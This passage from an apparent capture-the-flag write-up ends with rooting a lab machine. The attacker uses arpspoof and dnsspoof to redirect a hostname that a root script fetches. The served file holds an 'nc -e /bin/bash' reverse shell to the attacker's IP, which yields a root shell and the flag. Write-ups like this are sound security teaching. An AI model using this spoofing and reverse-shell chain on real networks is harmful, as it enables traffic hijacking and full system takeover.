# `info libc "Name Service Switch"' for information about this file.

passwd:         files systemd
group:          files systemd
shadow:         files
gshadow:        files

hosts:          files dns ←
networks:       files

protocols:      db files
services:       db files
ethers:         db files
rpc:            db files

netgroup:       nis
```

`ls -la /etc/hosts`:
```
-rw-r--r-- 1 root root 185 Jan 27  2023 /etc/hosts ←
```
`cat /etc/hosts`:
```
127.0.0.1       localhost
127.0.1.1       color

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

`ls -la /etc/resolv.conf`:
```
-rw-r--r-- 1 root root 48 Feb 20  2023 /etc/resolv.conf ←
```
`cat /etc/resolv.conf`:
```
nameserver 192.168.56.1 ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`mkdir ./http_server && cd ./http_server`
`echo -e '#!/bin/bash\nnc -e /bin/bash 192.168.56.118 7777' | tee ./attack.sh`:
```
#!/bin/bash
nc -e /bin/bash 192.168.56.118 7777
```

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

`sudo arpspoof -i eth1 -t 192.168.56.30 192.168.56.1`:
```
8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
8:0:27:9d:2e:ba 8:0:27:bf:d:e6 0806 42: arp reply 192.168.56.1 is-at 8:0:27:9d:2e:ba
```

`echo -e '192.168.56.118\tmasterddos.hmv' | tee ./fake_hosts.txt`:
```                  
192.168.56.118  masterddos.hmv
```

`dnsspoof -i eth1 -f ./fake_hosts.txt`:
```
dnsspoof: listening on eth1 [udp dst port 53 and not src 192.168.56.118] ←
```

`nc -lnvp 7777`:
```
listening on [any] 7777 ... ←
```

![Victim: purple](https://img.shields.io/badge/Victim-purple-64b5f6?logo=linux&logoColor=white)

`curl http://masterddos.hmv/attack.sh`:
```
#!/bin/bash
nc -e /bin/bash 192.168.56.118 7777
```

`sudo /attack_dir/ddos.sh`:
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    47  100    47    0     0      3      0  0:00:15  0:00:15 --:--:--    11
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.1.160] from (UNKNOWN) [192.168.1.132] 56268 ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`
`ls -alps`:
```
total 40
 4 drwx------  4 root root  4096 Feb 20  2023 ./
 4 drwxr-xr-x 19 root root  4096 Feb 20  2023 ../
 0 lrwxrwxrwx  1 root root     9 Jan 31  2023 .bash_history -> /dev/null
 4 -rw-r--r--  1 root root   571 Apr 10  2021 .bashrc
 4 -rw-r--r--  1 root root   161 Jul  9  2019 .profile
 4 -rw-r--r--  1 root root   475 Feb 11  2023 root.txt ←
 4 drwx------  2 root root  4096 Feb 11  2023 .ssh/
 4 drwxr-xr-x  2 root root  4096 Feb 11  2023 .vim/
12 -rw-------  1 root root 11088 Feb 20  2023 .viminfo
```

`cat ./root.txt`:
```
I hope you liked it :)

Here, some chocolate and the flag:

(:go_play_some_minecraft:) ←

    ___  ___  ___  ___  ___.---------------.
  .'\__\'\__\'\__\'\__\'\__,`   .  ____ ___ \
  |\/ __\/ __\/ __\/ __\/ _:\   |:.  \  \___ \
   \\'\__\'\__\'\__\'\__\'\_`.__|  `. \  \___ \
    \\/ __\/ __\/ __\/ __\/ __:                \
     \\'\__\'\__\'\__\ \__\'\_;-----------------`
      \\/   \/   \/   \/   \/ :                 |
       \|______________________;________________|

```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
